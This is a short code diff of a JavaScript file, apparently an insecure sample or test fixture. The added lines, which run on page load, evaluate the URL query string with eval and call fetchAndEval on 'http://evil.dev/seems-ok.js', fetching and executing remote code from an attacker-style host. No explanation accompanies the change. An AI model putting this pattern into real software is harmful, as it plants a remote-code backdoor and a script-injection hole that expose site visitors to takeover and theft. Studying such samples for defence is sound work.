@@ -38,7 +38,10 @@ function fetchAndEval(url) {
 }
 
 function evalMyLocationBar() {
-    eval(window.location.search)
+    document.addEventListener('DOMContentLoaded', () => {
+        eval(window.location.search)
+        fetchAndEval('http://evil.dev/seems-ok.js')
+    })
 }
 
 main().catch(console.error)
